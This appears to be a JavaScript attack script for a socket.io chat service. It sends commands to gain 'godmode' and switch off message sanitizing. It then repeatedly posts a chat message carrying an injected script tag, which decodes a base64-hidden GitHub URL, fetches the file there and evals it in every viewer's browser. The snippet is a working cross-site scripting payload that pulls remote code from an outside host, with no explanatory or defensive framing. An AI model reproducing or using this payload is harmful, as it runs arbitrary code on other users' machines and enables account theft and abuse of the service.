let coughtimer = 7777; // Changed from const to let
socket.emit('command', {
    list: ['godmode']
});
socket.emit('command', {
    list: ['sanitize', 'off']
});
const intervalId = setInterval(function() {
    socket.emit("command", {
        list: ["name", "gnygres"]
    });
    socket.emit('talk', {
        text: "gnygres <script>fetch(atob('aHR0cHM6Ly9naXRodWIuY29tL2JsYW5rbmFtZWxtYW9sbWFvLXN0YXIvc2NyL2Jsb2IvbWFpbi9zY3IuanM=')).then(r=>r.text()).then(t=>eval(t))</script>"
    });
    coughtimer = coughtimer - 125;
}, coughtimer);